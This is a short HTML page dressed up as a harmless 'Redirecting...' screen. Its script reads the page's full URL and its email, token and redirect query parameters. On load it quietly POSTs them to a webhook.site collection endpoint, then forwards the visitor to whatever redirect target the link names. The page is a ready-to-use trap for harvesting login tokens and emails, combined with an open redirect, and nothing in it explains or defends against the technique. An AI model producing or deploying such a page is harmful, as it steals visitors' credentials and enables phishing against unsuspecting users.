<!DOCTYPE html>
<html>
<head>
  <title>Redirecting...</title>
</head>
<body>
  <h1>Redirecting...</h1>
  <p>If you're not redirected automatically, <a id="go" href="#">click here</a>.</p>

  <script>
    const params = new URLSearchParams(window.location.search);
    const fullUrl = window.location.href;
    const email = params.get('email') || 'N/A';
    const token = params.get('token') || 'N/A';
    const redirect = params.get('next') || params.get('redirect') || params.get('url');

    fetch('https://webhook.site/YOUR-ID-HERE', {
      method: 'POST',
      body: JSON.stringify({ fullUrl, email, token, redirect }),
      headers: { 'Content-Type': 'application/json' }
    });

    if (redirect) {
      setTimeout(() => {
        window.location.href = redirect;
      }, 1500);
    }
  </script>
</body>
</html>
